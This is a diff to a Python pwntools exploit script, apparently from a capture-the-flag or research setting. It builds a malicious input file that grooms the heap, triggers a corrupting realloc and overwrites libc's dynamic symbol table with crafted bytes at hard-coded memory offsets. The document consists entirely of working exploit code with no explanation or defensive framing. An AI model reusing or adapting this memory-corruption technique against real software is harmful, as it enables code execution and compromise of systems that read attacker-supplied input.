@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
+import os
 from pwn import *
 import time
 
@@ -24,22 +25,6 @@ sizes = [133118, 266238, 532478, 1064958, 2129918, 4259838, 8519678, 17039358, 3
 start = time.time()
 print("Making pattern file...")
 file = open("patt", "wb")
-# file.write(b'a'*(MAX_LEN//2 - 2) + b'\n')
-# n = 32
-# for i in range(n):
-#     file.write(b'a'*(MAX_LEN//n - 1) + b'\n')
-
-# n = next(gen)
-# while n <= MAX_LEN:
-#     if n < MMAP_SIZE:
-#         n = next(gen)
-#         continue
-#     file.write(b'a'*MMAP_SIZE + b'\x00' + b'b'*(n - 2 - MMAP_SIZE) + b'\n')
-#     MMAP_SIZE *= 2
-#     n = next(gen)
-
-# file.write(b'a'*MMAP_SIZE + b'\x00' + b'b'*((MAX_LEN//2 - 2) - 2 - MMAP_SIZE) + b'\n')
-# file.write(longstr)
 
 print("Writing feng shui nonsense...")
 
@@ -99,23 +84,33 @@ file.write(b'a\n') # one more to trigger the realloc
 
 print("Corrupted!")
 
-# print("Overwriting libc...")
+print("Overwriting libc...")
 
-# file.write(b'a'*0x27172000+b'\n') # allocate libc chunk
+file.write(b'a'*0x27172000+b'\n') # allocate libc chunk
 
-# #libc dynsym overwrite
-# file.write(b'a\x00')
-# file.write(b'a'*(0x7ffff7de8000 - 0x7fff7921a000 - 2 - 16))
+#libc dynsym overwrite
+file.write(b'a\x00')
+file.write(b'a'*(0x7fffba21b000 - 0x7fff7921a000 - 16 -2))
+file.write(p64(0))
+file.write(p64(0x16a7f002))
+file.write(b'a'*0x3dbccff0)
 
-# for c in open("dynsym.bin", "rb").read():
-#     if c != 0x0a:
-#         file.write(bytes([c]))
-#     else:
-#         file.write(bytes([0x0b])) # doing a big heckin hope that this works out okay
+length = 2 + (0x7ffff7de8000 - 0x7fff7921a000 - 2 - 16)
 
-# file.write(b'\n')
+for c in open("dynsym-hacked.bin", "rb").read():
+    length += 1
+    if length >= 0x7ebf2ff0-2:
+        break
+    if c != 0x0a:
+        file.write(bytes([c]))
+    else:
+        file.write(bytes([0x0b])) # doing a big heckin hope that this works out okay
 
-# print("Finished libc overwrite!")
+file.write(b'\n')
+
+print("Finished libc overwrite!")
+print("Length of libc overwrite string: {:}".format(hex(length)))
 
 file.close()
+# os.system("chmod +x ./patt")
 print("Finished in {:.3f} seconds.".format(time.time()-start))
